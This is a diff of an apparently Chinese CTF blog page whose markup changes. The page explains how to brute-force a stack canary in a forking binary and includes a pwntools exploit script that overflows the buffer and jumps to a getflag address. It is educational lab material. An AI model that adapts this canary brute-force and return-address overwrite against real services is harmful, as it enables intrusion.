@@ -321,7 +321,7 @@
         
         <a  class="All PWN题 "
            href="/2020/07/03/HITCON-training-hacknote-UAF/"
-           data-tag="ctfwiki,UAF"
+           data-tag="UAF,ctfwiki"
            data-author="" >
             <span class="post-title" title="HITCON-training-hacknote(UAF)">HITCON-training-hacknote(UAF)</span>
             <span class="post-date" title="2020-07-03 10:43:46">2020/07/03</span>
@@ -408,7 +408,7 @@
     </div>
     <div class="article-meta">
         
-        <span>Count:840</span>
+        <span>Count:866</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -475,13 +475,41 @@
 </blockquote>
 <p>fun函数中存在溢出漏洞。buf大小是0x70，而我们可以输入0x78。</p>
 <p>3个条件都具备了，可以利用爆破手段爆出Canary的值了。</p>
-<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./bin1'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">canary_addr=<span class="string">'\x00'</span> </span><br><span class="line"><span class="comment">#低字节是\x00，我们是确定的，所以接下来只需要爆破剩余的3字节即可。</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):   <span class="comment">#3次</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		p.send(<span class="string">'a'</span>*<span class="number">100</span>+canary_addr+chr(x))   <span class="comment">#不断试错</span></span><br><span class="line">		get=p.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> get:</span><br><span class="line">			canary_addr+=chr(x)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">getflag=<span class="number">0x0804863B</span></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x70</span><span class="number">-0xc</span>)+ canary_addr +<span class="string">'a'</span>*<span class="number">12</span>+p32(getflag)  </span><br><span class="line"><span class="comment">#0xc是存储Canary的地方，所以我们需要填充(0x70-0xc)个字节垃圾数据。</span></span><br><span class="line"><span class="comment">#这里的canary的地址不用p32打包,因为爆破出来后没有作任何处理直接拿来用了，已经是小端序形式了。</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre><code class="python">#!/usr/bin/python3
+#coding=utf-8
+from pwn import *
+p=process(&#39;./bin1&#39;)
+context.log_level=&#39;debug&#39;
+canary_addr=&#39;\x00&#39; 
+#低字节是\x00，我们是确定的，所以接下来只需要爆破剩余的3字节即可。
 
+p.recvuntil(&#39;welcome\n&#39;)
+for i in range(3):   #3次
+    for x in range(256):
+        p.send(&#39;a&#39;*100+canary_addr+chr(x))   #不断试错
+        get=p.recvuntil(&quot;welcome\n&quot;)
+        if &#39;recv&#39; in get:
+            canary_addr+=chr(x)
+            break
+
+getflag=0x0804863B
+payload=&#39;a&#39;*(0x70-0xc)+ canary_addr +&#39;a&#39;*12+p32(getflag)  
+#0xc是存储Canary的地方，所以我们需要填充(0x70-0xc)个字节垃圾数据。
+#这里的canary的地址不用p32打包,因为爆破出来后没有作任何处理直接拿来用了，已经是小端序形式了。
+p.sendline(payload)
+p.interactive()
+</code></pre>
 <p>执行结果截图：<br><img src="https://i.loli.net/2020/07/04/N3pefMnzWljuArR.jpg" alt="本地"></p>
 <p>注意每一次运行程序的Canary值都是不一样的，这一次爆破出来的结果是 00 9f 21 af，因此canary的值为0xaf219f00</p>
 <p>可以看到图片下方出现”get flag error”字样，这个不用管，由于我们本地路径下没有这个文件，因此调用后门函数读取不到文件是很正常的事，exp没有问题，打远程的话，远程机子上一定会在指定目录下设置好flag文件的。</p>
 <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>关键代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):   </span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		p.send(<span class="string">'a'</span>*<span class="number">100</span>+canary_addr+chr(x)) </span><br><span class="line">		get=p.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> get:</span><br><span class="line">			canary_addr+=chr(x)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">for i in range(3):   
+    for x in range(256):
+        p.send(&#39;a&#39;*100+canary_addr+chr(x)) 
+        get=p.recvuntil(&quot;welcome\n&quot;)
+        if &#39;recv&#39; in get:
+            canary_addr+=chr(x)
+            break</code></pre>
 <p>由于程序有fork函数，所以我们可以不断覆盖canary进行试错，错误了就触发警报退出进程，那就再fork一个子进程继续试，试对了就进入下一个字节的爆破，然后就逐个字节地将 Canary 值爆破出来。然后老样子溢出构造payload。</p>
 <blockquote>
 <p>payload = ‘a’ * paddings + canary_addr + ‘a’ * 12 + p32(return_addr)</p>
